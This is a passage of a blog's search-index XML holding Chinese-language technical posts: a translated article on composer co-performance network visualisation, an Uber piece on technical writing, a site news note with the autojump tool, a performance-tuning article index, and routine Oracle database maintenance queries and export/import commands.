A1502早2015 扩展阅读参考文献 What’s New in Apple Filesystems 推荐一些 Mac 上比较好用的软件 scomper:OmniFocus 2 for Mac 的使用指南 OmniPlan 使用教程 | OmniPlan 3 for Mac 用户手册]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>OperatingSystem</tag>
        <tag>工具癖</tag>
        <tag>Mac</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（八）Program,Data and Classical Music]]></title>
    <url>%2F2018%2F12%2F16%2FVisualization-SocialNetwork%2F</url>
    <content type="text"><![CDATA[摘要 基于 Go + R 可视化古典音乐作曲家社交网络 Coperformance 是一个业余项目，融合了作者对编程，数据和古典音乐的兴趣爱好。 Key Words: Go , R , Composer , Visualization 原标题：Using Data to Visualize Connections Between Composers 链接：https://overthinkdciscores.com/2018/12/03/using-data-to-visualize-connections-between-composers 作者：Evan Murray 发表时间：12/03/2018 编程很有趣。我们能够制作很酷的东西，甚至无需考虑它对现实世界是否有实际用途。Coperformance 是一个业余项目，融合了作者对编程，数据和古典音乐的兴趣爱好。通过可视化应用 —— 我们可以从一个新的角度理解古典音乐作曲家以及他们之间的微妙联系。 该项目得以实现归功于纽约爱乐乐团这座艺术宝库 —— 它们建立了一个 Github 库以保存该团历史上所有的演出曲目。库中包含了大量信息，包括演出时间、地点，作曲家信息，独奏者信息，甚至是幕间休息的数据。这些数据都以 XML 或 JSON 格式编码，任何编程语言都可以解析和分析。 123456789101112131415161718192021222324252627282930313233343536373839404142434445&#123; "programs": [ &#123; "id": "38e072a7-8fc9-4f9a-8eac-3957905c0002", // GUID "programID": "3853", // NYP Local ID "orchestra": "New York Philharmonic", "season": "1842-43", "concerts": [ &#123; "eventType": "Subscription Season", "Location": "Manhattan, NY", "Venue": "Apollo Rooms", "Date": "1842-12-07T05:00:00Z", "Time": "8:00PM" &#125;, /* A program can have multiple concerts */ ], "works": [ &#123; "ID": "8834*4", // e.g. "1234*1" - first part is the Work ID, second part is the NYP Movement ID "composerName": "Weber, Carl Maria Von", "workTitle": "OBERON", "movement": "\"Ozean, du Ungeheuer\" (Ocean, thou mighty monster), Reiza (Scene and Aria), Act II", "conductorName": "Timm, Henry C.", "soloists": [ &#123; "soloistName": "Otto, Antoinette", "soloistInstrument": "Soprano", "soloistRoles": "S" &#125;, /* more soloists, if applicable. If no soloists, this will be an empty array */ ] &#125;, /* a program will usually have multiple works */ &#123; "ID": "0*", "interval": "Intermission", "soloists": [] &#125;, /* Intermissions will also appear in the works array */ ] &#125;, /* more programs */ ]&#125; 定义指标 定义新指标：Coperformance 鉴于演出历史库包含丰富的数据，我们最直接简单的想法是探索作曲家之间的联系 —— 作曲家在同一个演出中出现的频率是多少？我们使用这个指标是因为音乐总监经常根据主题将不同曲目放在一起，比如浪漫英雄主义（Romantic heroism），例如芝加哥交响乐团在安娜堡（Ann Arbor，密歇根州）演出曲目，包括贝多芬第五交响曲和马勒第一交响曲。 连接两个作曲家的原因多种多样。可能是缘于他们都创作类似的音乐——使用相同的形式和技巧、以不同的方式，或者由一个有趣的传记联系在一起。无论是什么，我们都期望它会导致两个作曲家比其他人更频繁地编排在一起。我们可以基于纽约爱乐乐团的数据库探索这些联系，因为数据的特殊性和令人难以置信的时间跨度，甚至可以追溯到爱乐乐团历史上的第一季。 为此，首先定义一个名为“Coperformance”指标。 Coperformance 值为：两位作曲家在同一节目中出现的次数和随机出现次数的比率。如果它的值大于 1，可以说两位作曲家以某种非常规的方式联系在一起。如果它的值小于或等于1，那么可以说这两位作曲家直接没有联系。 例子。假设每 100 场节目中就有 1 场同时出现两位作曲家。为了简化数学运算，数据库中有一百万场演出。如果作曲家只是随机出现，我们假设所有节目中有第一位作曲家出现的概率为 1％ ，第二位作曲家出现的概率也为 1％，即所有节目中两位作曲家同时出现的概率为 0.01％（本例中为100场）。事实上，如果两位作曲家一起出现在 200 个程序中，那么 Coperformance 值就是2，数据显示他们之间的联系非常紧密。如果他们只出现在 90 个节目中，那么从数据上看，没有证据表明两位作曲家之间有任何联系，除了他们都是古典音乐作曲家而已。 需要说明的是，Coperformance 指标只能衡量作曲家之间的链接数量，并不知道驱动链接的原因。如前所述，可能有各种各样的事物将作曲家联系起来并提高 Coperformance 值，从音乐风格到传记信息，“也许音乐总监喜欢两位作曲家的美学”。要弄清楚具体是什么驱动链接，需要另外检查它们出现在相同演出的原因，看看是否存在共同主题。 指标可视化Coperformance 指标可视化可以基于社交网络（Social networks）实现。 交友软件一般都是典型的社交网络，例如 Facebook/QQ/微信。社交网络主要由两部分组成：节点(nodes)和边(edges)。节点是网络中的个人，边是连接两个节点的线，就像两个 Facebook 好友一样。在我们的例子中，边是二元的和非定向的（两个人要么是、要么不是朋友；如果你不是我的朋友，我不能成为你的朋友）。实际上，边可以有不同的权重，也可以是定向的。 在作曲家网络中，每个节点都是一个单独的作曲家，边是加权的，并通过 Coperformance 值表示具有相同链接的作曲家。如果一对作曲家的 Coperformance 值大于 1，他们之间就具有强化联系，如果 Coperformance 值小于或等于 1 就不会。我们可以通过调整边的权重，使得变的线条更大、颜色更深（通过Coperformance 表现强化链接）进一步可视化网络。也可以对节点做类似的事情，使作曲家的节点根据他们在演出历史中出现的次数而变得越来越大或越来越小。 最后，可视化工具为了使网络更加漂亮，可以将作曲家分组为集群（clusters）或社区（communities）。如果几个作曲家交织在一起，那么他们彼此都会有很高的 Coperformance 值。这有点类似于 Facebook 上的社交圈（social clique）。集群可视化的实现方式简单说就是根据它们所属的社区对节点进行着色。对此，有两点需要特别说明： 首先，关于聚类算法的工作原理超出了本文的范围，可以参考 Wikipedia page on social network analysis 。 其次，就像 Coperformance 值无法解释将作曲家链接在一起的原因一样，聚类算法也无法解释到底是什么原因导致聚集发生。这是属于音乐导演和音乐学家需要回答的问题，而不属于数学领域。 总而言之，作曲家网络的节点代表单个作曲家，并且具有两个属性：大小表示他们上演的频率和颜色表示他们在网络中所属的集群。网络中的边表示作曲家之间的链接情况，随着连接变得越来越强边也就变得越来越大、颜色越来越深。 可视化编程构建作曲家网络的过程可以分为三个主要步骤：从格式化文件中读取数据，迭代数据中的所有成对出现的作曲家以计算其 Coperformance 值，网络可视化。 Go 语言在前两个步骤中表现非常棒，但它没有任何网络可视化软件包可以在易用性和功能性方面媲美 R igraph 和 R visNetwork 。此外，相比于类似的 Go 软件包，Rstudio shiny 在构建用户界面和下载数据方面更具优势。自然地，该项目使用 sexp 包（注：原作者编写的开源代码库）。上述所有元素组合在一起部署在服务器上，就可以实现作曲家网络及可视化应用。 使用说明。用户指定数据范围（开始和结束时间）以及网络中需要包含的作曲家的Coperformance 指标最小值。 首先，程序将这些数据文件的名称从 R（和 shiny 包）传递给 Go （使用 sexp 包）。然后，Go 读取文件，根据用户的规范解析数据，计算网络中所有作曲家成对出现的 Coperformance 值，并将结果写入用户可以下载的 JSON 和 csv 数据文件。接下来从 Go 获取数据文件名（通过 sexp 传递），计算网络中的集群，并将其可视化。 在这个项目中，虽然在没有 sexp 软件包的情况下几乎不会像现在这样干净，但它确实暴露了 sexp 软件包的弱点。通过文件连接 R 语言和 Go 语言太麻烦了，因为 sexp 不支持在 R 语言和 Go 语言之间传递矩阵（matrix）或字符串向量 (vector)。使 sexp 软件包更加灵活、缩小这一差距，将是我接下来的首要工作。 如果利用统计数据还可以改进作曲家网络。从统计学上讲，两位作曲家随机出现的出场次数不是一个特定的数字（如上例中的 100），而是基于概率的一系列数字。 如果将实际观测到的次数与我们认为合适的显着性水平（可能为95％）的上限进行比较，则可能更准确。例如，在上面的案例中将是 101 而不是 100 。(编者注：由于假设检验是根据样本提供的信息进行推断的，也就有犯错误的可能。例如，原假设正确，而我们却把它当成错误的加以拒绝。犯这种错误的概率用 α 表示，统计上把 α 称为假设检验中的显著性水平，也就是决策中所面临的风险。它是公认的小概率事件的概率值，必须在每一次统计检验之前确定，通常取α＝0.05 或 α＝0.01 。这表明，当作出接受原假设的决定时，其正确的可能性/概率为 95％ 或 99％） TipsNew York Philharmonic纽约爱乐（New York Philharmonic），正式全名为纽约爱乐交响乐协会（Philharmonic-Symphony Society of New York, Inc.），世界上历史最悠久的乐队之一， 1842 年在美国纽约市成立。纽约爱乐是美国成立时间最长的乐团，属于美国五大管弦乐团之一。纽约爱乐完成过多个音乐作品的美国首演，例如贝多芬的《第九交响曲》。纽约爱乐目前一年大约演出 180 场音乐会。 芝加哥交响乐团（穆蒂的新东家）的特点是有力量，以机床般强劲的铜管乐器为核心，这主要是由指挥弗里茨·莱纳(Fritz Reiner)带动起来的，后被格奥尔格·佐尔蒂(Georg Solti)进行了略带夸张的演绎；波士顿交响乐团的特点是稍微有点狂热，具有穿透力，很适合它演奏的法国音乐，指挥是查尔斯·明希(Charles Munch)和皮埃尔·蒙度(Pierre Monteux)；伦纳德·伯恩斯坦(Leonard Bernstein)领导下的纽约爱乐乐团的特点是态度轻松、随意。—— 《纽约时报》 官方网站（可检索自）：https://archives.nyphil.org New York Philharmonic Coperformance Project Chicago Youth Symphony Orchestra Chicago Youth Symphony Orchestra college advancement statistics for diversity initiative These statistics are of great concern to those within the classical music world, and especially amongst orchestras in Chicago, which is one of America’s most diverse cities. To this end, several of the city’s leading classical music teaching institutions have formed a partnership to understand and enhance their roles in cultivating diverse professional musicians of tomorrow. This group, the Chicago Musical Pathways Initiative, was built to identify talented, motivated students early in their training, provide them with the resources they need to help them achieve their full musical potential, and ultimately to increase diversity in America’s professional, musical landscape. 资源链接 Project Coperformance Site Project Code:New York Philharmonic and Social Network Analysis New York Philharmonic Performance History repository Wikipedia page on social network analysis R ShinyShiny is an R package that makes it easy to build interactive web apps straight from R. You can host standalone apps on a webpage or embed them in R Markdown documents or build dashboards. You can also extend your Shiny apps with CSS themes, htmlwidgets, and JavaScript actions. R visNetworkvisNetwork is an R package for network visualization, using vis.js javascript library (http://visjs.org/) Project igraphigraph is a collection of network analysis tools with the emphasis on efficiency, portability and ease of use. igraph is open source and free. igraph can be programmed in R, Python, Mathematica and C/C++. Project sexp (Rgo) 扩展阅读音乐史 古典音乐低俗史 数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 数据可视化（八）Program,Data and Classical Music 数据可视化（十）公共数据源列表 参考文献 纽约爱乐 芝加哥交响乐团]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Artistic</tag>
        <tag>Engineering</tag>
        <tag>Developer</tag>
        <tag>数据可视化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工程师的自我修养：技术团队中的作家]]></title>
    <url>%2F2018%2F12%2F02%2FWriting-Technical%2F</url>
    <content type="text"><![CDATA[摘要 Uber 工程团队中的技术作家 技术作家究竟做什么？ 技术作家最大的挑战是什么？ 关于技术写作最大的误解是什么？ This article is part of an Uber Engineering tutorial series. Make sure to check out my other articles as well: Uber 业务预测系统实践 Uber Hadoop 文件系统最佳实践 Uber JVM 性能追踪工具 Uber 技术团队中的作家 Uber 工程团队中的技术作家在本文中，Uber 前实习生 Shannon Brown 介绍了她作为技术作家的工作情况，并回答了 Uber 工程团队中有关这一重要角色的常见问题。 原标题：Seven Things to Know about Technical Writing at Uber 链接：https://eng.uber.com/technical-writing-uber 作者：Shannon Brown 发表时间：October 3, 2018 就在一年多前，我第一次走进 Uber 旧金山办事处。开始了为期 12 周的实习生活，我将开始了解技术写作的世界但我当时不知道会发生什么。 有些问题其实一直萦绕在我耳边，例如技术作家的工作究竟是做什么？我想长期在 Uber 工作吗？在整个实习期间，这些问题的答案变得越来越清晰。我在夏天实习期结束时找到了答案并且确信这就是我想要追求的道路，我最终选择并且非常高兴接受这份工作。 在大学毕业后选择工作时，我面临的问题从来不是我想做什么？而是我怎么能完成所有这些事情呢？我一直在寻找一份能够让我发挥创造力和分析能力的工作。我期望自己能从事很酷的技术创新，但我对编写代码并不感兴趣。我希望有一份工作可以每天都有意外惊喜并且能够持续学习。Amazingly, technical writing checked every box. 技术写作可能是一种被误解的职业，所以我将自己的经历提炼成了七个常见问题。希望未来的作家和技术专家能获益。 技术作家究竟做什么？尽管进行了数小时的在线学习，但直到我的实习走向深入并处理了大量激动人心的项目，才终于理解技术作家的工作。 通常，技术作家记录由工程师构建的服务或产品。该文档将有助于新用户理解产品，传播有关服务如何工作的信息，并将技术术语翻译成易于理解的文章。但是，文档工作只是技术作家的诸多任务之一。除了记录，技术作家还可以创建培训材料，分析数据，访问用户，编写产品案例，并提出信息架构问题的解决方案。有些日子你必须像工程师一样思考，而其他人则像项目经理一样。这项工作充满活力，充满挑战，而且收获颇丰。 技术作家最大的挑战是什么？作为 Uber 的技术作家，我同时与多个项目的多个团队合作，这一工作模式需要频繁的上下文切换和多任务处理 — 有时是一个挑战！为了确保我能够在最后期限之前保持最佳状态并为我合作的团队服务，我必须保持高效率和时间计划的有条不紊。 因为我与多个团队合作，所以我也有很大的机会发挥影响力。这是非常有益的，因为我编写的文档和创建的学习内容可以帮助我的同事更快地理解、处理和学习信息 — 这对于 Uber 工程效率和生产力来说是一个巨大的帮助。 关于技术写作最大的误解是什么？由于技术写作不是一个超级知名的职业道路，因此存在许多误解。最让我印象深刻的说法是技术写作很无聊。 这是完全错误的（除非你讨厌阅读和写作，并且希望与酷炫技术无关）。 事实上，这项工作非常有趣。正如我之前提到的，需要同时研究这么多有趣的项目。如果我对一个人感到厌倦，可以换另一个人休息几个小时。这样我可以保持参与度，也就不会觉得工作无聊。 关于技术写作的另一个主要误解是必须具备技术背景。正如您将在下一节中读到的那样，这也是错误的！ 是否需要工程学位/背景才能成为技术作家？许多人认为需要工程学位/背景才能成为技术作家，这实际上是另一个很大的误解。 我再大学里课程包括计算机科学，音乐和艺术。虽然计算机科学课程有助于理解技术概念，但我的教育中最有用的方面实际上是学习如何学习和倾听。在学校学习的一些技术工具和概念有助于我作为技术作家的角色，但最重要的是，他们引导我快速学习并提出问题，这对于科技写作工作至关重要。 技术作家来自不同的背景，你决不需要工程学位或背景来开始这个领域（尽管它肯定没有害处！）。如果有很强的写作技巧和学习的愿望，技术写作可能非常适合你。 为什么喜欢在 Uber 担任技术作家？无论您处于职业生涯的哪个阶段，或者拥有什么职位，都必须考虑所在公司是否与您的目标和价值观一致。 在 Uber 工作最好的部分是人。无论是作为实习生还是全职员工，当第一次加入团队时，我的团队成员都竭尽全力欢迎并指导我 — 对我的团队来说对其他人也是如此。我在 Uber 遇到的每个人都对他们的工作充满热情，热情和热情。办公室的能量具有传染性，强烈的社区意识和自豪感使我每天都期待上班。 我很喜欢 Uber 是一个可以通过向上和横向流动来建立自己职业生涯的地方。我的一位同事刚刚从技术作家角色转变为软件工程师角色，另一位同事转变为项目经理角色，都在 Uber 内部完成转变。我欣赏 Uber 对于岗位流动性的支持态度。 特别是从技术写作的角度来看，我认为优步是一家伟大的公司。我得到了各级管理层的支持，他们真正看到了技术写作的价值。感谢这种支持，我知道我的工作很重要。当我的工作项目遇到挑战时，这有助于让我保持积极性。 最后，成为 Uber 家族的一员让我很兴奋，因为我们所做的工作不仅影响了现在，也影响了未来。我很高兴能成为一家正在改变交通运输业的公司一员。 与其他组织相比，Uber 的技术写作有何不同？因为我的行业经验有限，所以我征求了 Uber 技术作家的帮助，以此来讨论这个话题。 高级技术作家亚当·帕夫拉卡（Adam Pavlacka）：Uber 非常重视引导工程师撰写并真正鼓励良好文档的工作文化。虽然许多公司只聘请作家提供文档或从工程师的笔记中抄写原始副本，但 Uber 聘请的技术作家会以更加亲力亲为的方式学习他们正在撰写的主题。 给有志于成为技术作家的最大建议是什么？如果您想成为技术作家，请立即开始写作！您不需要正式工作来练习技术写作技巧。查找有关您使用的产品或应用的现有文档，并了解如何改进它。与需要文档帮助的开源项目一起工作。查看有关激动人心技术概念的在线教程。这些小步骤将有助于建立您的投资组合并发展您的技能。 如果你认为自己不够“技术人员”或者不适合技术作家的模式，也不要放弃成为技术作家的想法。条条大路通罗马！如果您有志于成为技术作家，请遵循您内心的愿望走向成功。 扩展阅读 最佳写作实践：从Evernote到Ulysses 技术团队中的作家 我的写作工具链 Kanban 看板管理实践精要 数据可视化（一）思维利器 OmniGraffle 绘图指南 参考文献 写博客如何助力敏捷团队(How Blogging Empowers Agile Teams)| Matt Jukes - mySociety产品经理 Agile Cambridge 2017 How to write a good software design doc 使用Landslide基于MarkDown制作在线Slide 技术作家成长之路：技术博客到技术作家 专访Java作家孙卫琴：感受女性技术专家的成长经历 | 2007-10-17]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>eBook</tag>
        <tag>工具癖</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Night News 20181201]]></title>
    <url>%2F2018%2F12%2F01%2FNews-Night-20181201%2F</url>
    <content type="text"><![CDATA[摘要 上线新域名：riboseyim.com 恢复:七牛云图床故障 发布:写作工具链v5 推荐工具:AutoJump 上线一个纯洁的域名新域名 解决七牛云“测试”域名回收导致的图床故障 提高墙内用户的访问速度和稳定性 https://riboseyim.com恢复：七牛云图床故障以下图床域名统一更新为：http://riboseyim-qiniu.riboseyim.com 。 12345678910http://o8m8ngokc.bkt.clouddn.comhttp://og2061b3n.bkt.clouddn.comhttp://ogtqvs10n.bkt.clouddn.comhttp://okkuj60pj.bkt.clouddn.comhttp://omaxozji3.bkt.clouddn.comhttp://omb2onfvy.bkt.clouddn.comhttp://ombx24fbq.bkt.clouddn.comhttp://osgiyhxhy.bkt.clouddn.comhttp://ot6idm48o.bkt.clouddn.comhttp://p11slcnom.bkt.clouddn.com 发布：写作工具链v5 add 独立域名 https://riboseyim.com [Ribose Yim’s Tech Blog] 【腾讯云】 故障修复：图床域名更换 xxx.clouddn.com to http://riboseyim-qiniu.riboseyim.com 【七牛云】 add hexo theme Cafe auto syn workflow: from riboseyim.github.io to project riboseyim.com add Xmind replace MindManager,201807 更多细节请查看 《我的写作工具链》 1234567# 主题$ git clone https://github.com/giscafer/hexo-theme-cafe.git themes/cafe# 素材链接替换$ grep 'clouddn.com' ./*.md | awk -F '(' '&#123;print $2&#125;' | awk -F '.com' '&#123;print $1&#125;' &gt; oldomain.log$ sort -n oldomain.log | uniq &gt; oldomin.list$ gsed -e "s/old/new/g" sourcefile &gt; targetfile 推荐工具:AutoJumpautojump 记录你访问过的文件夹（包括记录访问频率进而调整权重），通过路径 cache 实现文件夹位置快速切换。了解更多细节请查看 DevOps 资讯 | 是时候升级你的命令行了 Install 1234# sourcegit clone git://github.com/wting/autojump.gitcd autojump./install.py or ./uninstall.py Example 12345678910111213141516171819202122232425262728293031323334353637383940414243aca80164:~ kurui$ j -s10.0: /Users/yanrui/project/riboseyim.com50.0: /Users/yanrui/project-third/autojump50.0: /Users/yanrui/project/riboseyim.github.io/source/_posts________________________________________109: total weight3: number of entries0.00: current directory weightdata: /Users/yanrui/Library/autojump/autojump.txtaca80164:~ kurui$aca80164:~ kurui$ cd project/ebook-linuxperfmaster/aca80164:ebook-linuxperfmaster kurui$ j -s10.0: /Users/yanrui/project/riboseyim.com14.1: /Users/yanrui/project/ebook-linuxperfmaster50.0: /Users/yanrui/project-third/autojump50.0: /Users/yanrui/project/riboseyim.github.io/source/_posts________________________________________124: total weight4: number of entries14.14: current directory weightdata: /Users/yanrui/Library/autojump/autojump.txtaca80164:ebook-linuxperfmaster kurui$aca80164:ebook-linuxperfmaster kurui$ j post/Users/yanrui/project/riboseyim.github.io/source/_postsaca80164:_posts kurui$ pwd/Users/yanrui/project/riboseyim.github.io/source/_postsaca80164:_posts kurui$ j -s10.0: /Users/yanrui/project/riboseyim.com22.4: /Users/yanrui/project/ebook-linuxperfmaster50.0: /Users/yanrui/project-third/autojump52.0: /Users/yanrui/project/riboseyim.github.io/source/_posts________________________________________134: total weight4: number of entries51.96: current directory weightdata: /Users/yanrui/Library/autojump/autojump.txtaca80164:_posts kurui$]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>News</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[性能优化技术实践]]></title>
    <url>%2F2018%2F11%2F30%2FTechnology-Performance-Tuning%2F</url>
    <content type="text"><![CDATA[摘要 性能优化 CPU 性能优化 Memory 性能优化 IO 性能优化 应用性能优化 数据库性能优化 初阶课程：快速诊断实践 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 Linux 性能诊断:Java VM Linux 性能诊断:Go App (规划) Linux 性能诊断:Web Server Linux 性能诊断:Oracle (规划) Linux 性能诊断:Redis (规划) Linux 性能诊断:Hadoop (规划) 操作系统原理 | How Linux Works（一）：启动 操作系统原理 | How Linux Works（二）：空间管理 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（四）：网络管理 中阶课程：性能分析实践 DevOps 漫谈：分布式追踪系统体系概要 DevOps 漫谈：开源分布式跟踪系统 OpenCensus 高阶课程：动态追踪实践 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考案例 Performance Tuning | oracleonlinux 扩展阅读：电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 参考文献 Oracle Performance Tuning Interview Questions]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Oracle 数据库日常维护]]></title>
    <url>%2F2018%2F11%2F21%2FTechnology-Oracle-Ops%2F</url>
    <content type="text"><![CDATA[摘要 【编辑中】 init params files tree INSTALLSecurity123456789sql&gt;alter user USER_NAME identified by USER_PASSWD;--查看用户的proifle，默认：defaultsql&gt;SELECT username,PROFILE FROM dba_users where username='admin' ;sql&gt;SELECT * FROM dba_profiles s WHERE s.profile='DEFAULT' AND resource_name='PASSWORD_LIFE_TIME';sql&gt;ALTER PROFILE DEFAULT LIMIT PASSWORD_LIFE_TIME UNLIMITED;sql&gt;ALTER PROFILE DEFAULT LIMIT PASSWORD_LIFE_TIME 90; Init Params 初始化参数文件（Initialization Parameters Files,pfile）pfile 默认为“init+例程名.ora”,文本文件，可以手工编辑。 spfile:服务器参数文件（Server Parameter Files）spfile 默认为“spfile+例程名.ora”，不能用vi编辑器对其中参数进行修改，只能通过命令在线修改。 1234567891011-- $ORACLE_HOME/dbs/spfiledbnms.ora--pfile格式转换：将二进制转换为文本格式SQL&gt; CREATE Spfile FROM pfile;这种方法，然后再用vi编辑器对其中的参数进行直观修改，以达到方便的目的。--pfile格式转换：将文本转为二进制格式SQL&gt; CREATE pfile FROM Spfile;# df -k /dev/shmFilesystem 1K-blocks Used Available Use% Mounted ontmpfs 4194304 288 4194016 1% /dev/shm SGA pga_aggregate_target SGA_TARGET specifies the total size of all SGA components.If SGA_TARGET is specified, then the following memory pools are automatically sized: Buffer cache (DB_CACHE_SIZE) Shared pool (SHARED_POOL_SIZE) Large pool (LARGE_POOL_SIZE) Java pool (JAVA_POOL_SIZE) Streams pool (STREAMS_POOL_SIZE) 1pga_aggregate_target = total memory - SGA When setting this parameter, you should examine the total memory on your system that is available to the Oracle instance and subtract the SGA. You can assign the remaining memory to PGA_AGGREGATE_TARGET. 12345678910111213141516171819202122232425262728293031# example:vi $ORACLE_HOME/dbs/spfiledbnms.ora# dbnms.__java_pool_size=939524096# dbnms.__large_pool_size=805306368dbnms.__java_pool_size=4294967296dbnms.__large_pool_size=4294967296dbnms.__oracle_base='/oracle/product'#ORACLE_BASE set from environment#dbnms.__pga_aggregate_target=16106127360dbnms.__pga_aggregate_target=0#dbnms.__sga_target=64424509440dbnms.sga_target=4294967296dbnms.__shared_io_pool_size=0dbnms.__shared_pool_size=4697620480dbnms.__streams_pool_size=0*.audit_file_dest='/oracle/product/admin/dbnms/adump'*.audit_trail='db'*.compatible='11.2.0.4.0'*.control_files='/oradata1/dbnms/control01.ctl','/oradata2/dbnms/control02.ctl'*.db_block_size=8192*.db_domain=''*.db_name='dbnms'*.diagnostic_dest='/oracle/product'*.dispatchers='(PROTOCOL=TCP) (SERVICE=dbnms)'*.open_cursors=300#*.pga_aggregate_target=16106127360*.pga_aggregate_target=0*.processes=1500*.remote_login_passwordfile='EXCLUSIVE'*.sessions=1655# *.sga_target=64424509440*.sga_target=4294967296*.undo_tablespace='UNDOTBS1' OptimizingMetric1234567select 'vsession:'||count(*)||'' as moni from v$sessionunionselect 'maxsessions:'||value||'' as sessions from v$parameter where name = 'sessions'unionselect 'vprocess:'||count(*)||'' from v$processunionselect 'maxprocess:'||value||'' from v$parameter where name = 'processes' Events123456789101112131415select * from v$event_name;select * from v$sql;select p.spid, s.osuser, s.program ,p.* from v$session s,v$process p where s.paddr=p.addr and s.SID='8463';---eg:Buffer Busy Waitsselect sql_text from v$sql t1, v$session t2, v$session_wait t3 where 1=1and t1.address=t2.sql_address and t1.hash_value=t2.sql_hash_valueand t2.sid=t3.sid and t3.event='buffer busy waits'; SQL TOP IO SQL 12345-- - TOP IO SQLselect p.spid,s.sid,s.machine,s.program,q.disk_reads,q.sql_textfrom v$process p,v$session s,v$sql qwhere p.addr=s.paddr and s.sql_id=q.sql_idorder by 5; INDEX12345678analyze table TABLENAME compute statistics; select sid,opname,target,sofar,totalwork,trunc(sofar/totalwork*100,2)||'%' as perworkfrom v$session_longops where sofar!=totalwork and sid='1479';-- 21:16 1 1479 Table Scan SLVIEW.FLUX 6457 128417 5.02%-- 1 1479 Table Scan TEST.TABLE_A 14813 128417 11.53% Lock123456789101112131415161718192021222324252627282930313233select 'alter system kill session '''||''||s.sid||','||s.serial#||''';'from v$locked_object lo,dba_objects ao,v$session swhere ao.object_id = lo.object_id and lo.session_id = s.sidand object_name = 'TABLENAME';select /*+ rule */ s.username,decode(l.type,'TM','TABLE LOCK','TX','ROW LOCK',NULL) LOCK_LEVEL,o.owner,o.object_name,o.object_type,s.sid,s.serial#,s.terminal,s.machine,s.program,s.osuser,l.CTIMEFROM v$session s,v$lock l,dba_objects o WHERE l.sid = s.sid AND l.id1 = o.object_id(+)and machine ='HOST_NAME'and owner='USER_NAME' and object_name='TABLE_NAME'select t2.username, t2.sid, t2.serial#, t3.object_name, t2.OSUSER, t2.MACHINE, t2.PROGRAM, t2.LOGON_TIME, t2.COMMAND, t2.LOCKWAIT, t2.SADDR, t2.PADDR, t2.TADDR, t2.SQL_ADDRESS, t1.LOCKED_MODE from v$locked_object t1, v$session t2, dba_objects t3 where t1.session_id = t2.sid and t1.object_id = t3.object_id order by t2.logon_time; Constraint12345678910111213141516select a.constraint_name, a.table_name, b.constraint_namefrom user_constraints a, user_constraints bwherea.constraint_type = 'R' --外键--and b.constraint_type = 'P' --主键and a.r_constraint_name = b.constraint_nameand a.constraint_name like '%KEY_NAME%';-- 启用外键约束alter table table_name enable constraint constraint_name-- 禁用外键约束alter table table_name disable constraint constraint_nameselect 'alter table '||table_name||' enable constraint '||constraint_name||';' from user_constraints where constraint_type='R';select 'alter table '||table_name||' disable constraint '||constraint_name||';' from user_constraints where constraint_type='R' ; 数据迁移数据泵1234567891011121314151617## 第一步：迁移准备，默认参数select * from dba_directories;create directory dir_dp as '/oradata1/backdp'## 第二步:备份数据expdp 'dbusername/******#@dbnms' directory=DIR_DP dumpfile=LOG_P_20200930.dmp tables=USERLOGINFO:P_20200930 logfile=LOG_EXP_20200930.log &amp;## 第三步：Rename历史表rename USERLOGINFO to USERLOGINFO_20200910;## 第四步：重建表数据impdp 'dbusername/******#@dbnms' directory=DIR_DP dumpfile=LOG_P_20200930.dmp remap_tablespace=DATALIST:DATALOG logfile=LOG_IMP_20200930.log &amp;impdp 'dbusername/******@@dbnms' directory=DIR_DP dumpfile=LOG_P_20200831.dmp remap_tablespace=DATALIST:DATALOG logfile=LOG_IMP_20200831.log table_exists_action=append &amp; 注意事项 REMAP_TABLE feature was only introduced in 11G Expdp12345678910111213141516171819202122# more LOG_EXP_20200930.log;;;Export: Release 10.2.0.4.0 - 64bit Production on Thursday, 10 September, 2020 23:25:16Copyright (c) 2003, 2007, Oracle. All rights reserved.;;;Connected to: Oracle Database 10g Enterprise Edition Release 10.2.0.4.0 - 64bit ProductionWith the Partitioning, OLAP, Data Mining and Real Application Testing optionsStarting "DBUSER"."SYS_EXPORT_TABLE_04": dbusername/********@dbnms directory=DIR_DP dumpfile=LOG_P_20200930.dmp tables=USERLOGINFO:P_20200930 logfile=LOG_EXP_20200930.logEstimate in progress using BLOCKS method...Processing object type TABLE_EXPORT/TABLE/TABLE_DATATotal estimation using BLOCKS method: 4.994 GBProcessing object type TABLE_EXPORT/TABLE/TABLEProcessing object type TABLE_EXPORT/TABLE/INDEX/INDEXProcessing object type TABLE_EXPORT/TABLE/INDEX/STATISTICS/INDEX_STATISTICSProcessing object type TABLE_EXPORT/TABLE/STATISTICS/TABLE_STATISTICS. . exported "DBUSER"."USERLOGINFO":"P_20200930" 4.335 GB 46060706 rowsMaster table "DBUSER"."SYS_EXPORT_TABLE_04" successfully loaded/unloaded******************************************************************************Dump file set for SLVIEW.SYS_EXPORT_TABLE_04 is: /oradata1/backdp/LOG_P_20200930.dmpJob "DBUSER"."SYS_EXPORT_TABLE_04" successfully completed at 23:47:46 